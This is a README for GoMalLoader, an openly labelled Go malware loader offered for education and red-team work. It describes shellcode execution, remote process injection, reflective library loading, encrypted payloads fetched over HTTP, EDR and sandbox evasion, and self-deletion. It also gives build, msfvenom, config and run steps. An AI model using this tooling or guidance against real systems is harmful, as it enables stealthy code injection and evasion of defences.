# 🛠️ GoMalLoader: Modular Malware Loader in Go

# ⚠️ WARNING

**This project is a modular malware loader capable of executing, injecting, and reflectively loading arbitrary code. Running this code on your main computer or any production system can be extremely dangerous and may harm your device, data, or network.**

- Only run GoMalLoader in a disposable, isolated virtual machine or test environment.
- Never use this tool on systems you do not own or have explicit permission to test.
- Use for educational, research, or red team purposes only, and always follow all applicable laws and ethical guidelines.

---

## Overview

**GoMalLoader** is a modular, cross-platform malware loader written in Go. It supports advanced payload delivery and evasion techniques across Windows, Linux, and MacOS, with a focus on modularity and extensibility.

This project was created to explore malware loader architectures, evasion techniques, and cross-platform payload delivery mechanisms. It is intended for **educational and research** purposes only.

---

## Features


| Feature               | Description                                                                 |
|-----------------------|-----------------------------------------------------------------------------|
| `shellcode`           | Load and execute raw shellcode in current process                           |
| `inject_remote`       | Inject shellcode into a target process (Windows, Linux, Mac)                |
| `dll_reflective`      | Reflectively load and execute a DLL/SO/dylib in memory                      |
| AES decryption        | Payloads encrypted via AES-CBC                                              |
| Configurable source   | Payloads loaded from disk or URL                                            |
| EDR evasion           | Mutex locking, sleep skew detection, sandbox name checks                    |
| Optional self-delete  | Deletes loader after execution (platform-specific implementation)           |

---

## Architecture

- **Modular, interface-driven design**: Loader modes and utilities are abstracted via interfaces with platform-specific implementations.
- **Cross-platform support**: Uses Go build tags and file suffixes for platform-specific files.
- **Loader Modes**:
  - `shellcode`: Executes shellcode in the current process.
  - `inject_remote`: Injects shellcode into a remote process using platform-specific techniques.
  - `dll_reflective`: Loads shared libraries (DLL/SO/dylib) into memory without touching disk (Windows/Linux) or with minimal disk footprint (Mac).
- **Utilities**: AES decryption, evasion mechanisms, memory allocation, process/thread manipulation.

---

## Cross-Platform Reflective Loader Strategies

- **Windows**: Manual PE parsing and in-memory DLL loading (true reflective loader).
- **Linux**: Uses `memfd_create` and `dlopen` for in-memory ELF loading without disk writes.
- **MacOS**: Writes Mach-O dylib payloads to a temp file, loads via `dlopen`, and deletes the file post-load.

### ⚠️ Pure In-Memory Mach-O Loading (MacOS)

macOS does **not natively support pure in-memory Mach-O loading**:

- The system dynamic loader (`dyld`) requires a file path.
- True in-memory loading needs a custom loader for parsing, mapping, relocation, and symbol resolution.

**Future Work**: Implement a custom Mach-O loader in Go or C for true in-memory loading.

---

## Usage Guide

### 1. Build the Loader

```sh

# Windows
GOOS=windows GOARCH=amd64 go build -o loader.exe
# Linux
GOOS=linux GOARCH=amd64 go build -o loader_linux
# MacOS
GOOS=darwin GOARCH=amd64 go build -o loader_mac

```

### 2. Generate a Payload

Using `msfvenom`, Donut, or your own tools:

```sh
msfvenom -p windows/x64/messagebox TEXT="hello" -f raw -o raw_shellcode.bin
```

### 3. Encrypt the Payload

```sh
python build.py --in raw_shellcode.bin --out encrypted_shellcode.bin --key 0123456789abcdef
```

### 4. Serve Over HTTP (Optional)

```sh
python -m http.server 8000
```

### 5. Configure the Loader

Edit `config.json`:

```json
{
  "mode": "inject_remote",
  "source": "url",
  "url": "http://localhost:8000/encrypted_shellcode.bin",
  "path": "payloads/shellcode.bin",
  "aes_key": "0123456789abcdef",
  "target_process": "notepad.exe",
  "obfuscated": true,
  "self_delete": true
}
```

### 6. Run the Loader

```sh
# Example for Linux remote injection (requires root)
sudo ./loader_linux
```

### 7. Observe and Troubleshoot

- Check logs for status and errors.
- Always test in isolated environments.
- Expect antivirus or EDR detections.

---

## Legal

This project is for **educational and red team** purposes only.  
Do **not** deploy in production or on systems without **explicit permission**.

---
